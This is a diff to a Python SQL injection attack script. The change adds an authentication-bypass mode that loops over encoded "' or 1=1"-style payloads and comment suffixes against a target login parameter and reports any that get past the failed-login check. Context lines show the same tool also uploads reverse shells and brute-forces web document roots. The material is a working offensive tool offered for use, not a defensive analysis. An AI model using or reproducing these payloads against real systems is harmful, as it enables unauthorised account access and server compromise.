@@ -21,6 +21,7 @@ arg_parser.add_argument("-H", dest="header", type=str, help="One or multiple hea
 arg_parser.add_argument("-c", "--cookies", dest="cookies", type=str, help="One or multiple cookies values for the request, separate with a space\nUse like 'PHPSESSID=shuv7rnuv UserToken=yes'")
 arg_parser.add_argument('-u','--url', dest='url', help='The url to use for sqli', required=True, type=str)
 arg_parser.add_argument('-p','--parameter', dest='parameter', help='The injectable parameter', required=True, type=str)
+arg_parser.add_argument('-b','--bypass', dest='bypass', help='Bypass the authentication.\n define the failed login message', type=str)
 arg_parser.add_argument('-l','--level', dest='level', help='The level of the scan (l|h) "l" for little, and "h" for huge', default='l', type=str)
 arg_parser.add_argument('-v', '--verbose', dest='verbose', help='Define verbose output. set to False by default', type=str, default="FALSE")
 args = arg_parser.parse_args()
@@ -71,6 +72,8 @@ BRUTE_DOC_ROOT_PREFIXES = {
 }
 # inject test
 INJECT_TEST = ("'","''","\"","\"\"","\\","\\\\")
+#bypass authentication 
+BYPASS_AUTH = ("' or 1=1 ","' Or 1=1 ","' oR 1=1 ","\%27\%20\%6f\%72\%201\%3D1\%20 ", "%27%20%7c%7c%201%3D1 ","' || 1=1 "," or 1=1 "," Or 1=1 "," oR 1=1 ","%20%6f%72%201%3D1%20 ", "%20%7c%7c%201%3D1 "," || 1=1 ","' and 1=1 ","' And 1=1 ","' aNd 1=1 ","' anD 1=1 ","' && 1=1 ","' %26%26 1=1 ","%27%20%26%26%201%3D1%20","%27%20%20%61%6e%64%20%31%3d%31%20"," and 1=1 "," And 1=1 "," aNd 1=1 "," anD 1=1 "," && 1=1 "," %26%26 1=1 ","%20%26%26%201%3D1%20","%20%20%61%6e%64%20%31%3d%31%20")
 # Suffixes used in brute force search for web server document root
 BRUTE_DOC_ROOT_SUFFIXES = ("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "www", "data", "sites/all", "www/build")
 
@@ -126,7 +129,7 @@ def send_request():
   if ( args.method.lower() == "get" ):
     req=requests.post(args.url,allow_redirects=False,verify=False,params=REQUEST, headers=HEADERS, cookies=COOKIES,timeout=30)
   else:
-    req=requests.post(args.url,allow_redirects=False,verify=False,data=REQUEST, headers=HEADERS, cookies=COOKIES,timeout=30)
+    req=requests.post(args.url,allow_redirects=False,verify=False,data=REQUEST, headers=HEADERS, cookies=COOKIES,timeout=30,proxies=proxies)
   return req  
 
 # upload a rev shell
@@ -168,13 +171,43 @@ def found_revshell(path,revname,list_url):
         debug("Success. The rev shell uploaded in path "+fpath+" and you can access it at the url: "+url)  
         list_url[url]=fpath
 
-# Verify if param injectable and define return error
+#the request without injection
 TYPE_VERIFY = {}
 req=send_request()  
 code=req.status_code
 TYPE_VERIFY["success_code"]= code
 TYPE_VERIFY["content"] = req.headers['Content-Length']
 debug('The request without injection return code: '+str(code))
+
+# if bypass_authentification
+if args.bypass is not None:
+  found = False
+  for inject1 in BYPASS_AUTH:
+    for inject2 in SQLI_COMMENT:
+      inject = inject1+inject2
+      debug('Injection string: '+inject1)
+      REQUEST[args.parameter] = inject
+      req=send_request() 
+      debug('The request data sent: '+str(REQUEST))
+      debug('The response code is: '+str(req.status_code))  
+      output = req.content.lower()
+      if (req.status_code != code or not args.bypass.lower() in output ):
+        found = True
+        debug('Success bypass authentication : '+inject)
+        break
+    if found:
+      break
+  if found:
+    print colored('[Bypass-Authentication] Found a sqli injection to bypass the from: '+REQUEST[args.parameter], "green")
+    sys.exit(1)
+  else:
+    print colored('[Bypass-Authentication] All bypass injections Failed ', "red")
+    action="no"
+    action = raw_input("Do you want continue trying other sqli. 'No' by default: [y/n] ")
+    if action.lower() not in ('y','yes'):
+      sys.exit(1)  
+
+# Verify if param injectable and define return error
 # try injections
 found = False
 errors = ['sql syntax', 'error:', 'syntax to use near', 'syntax error', 'cardinality violation', 'select statements']
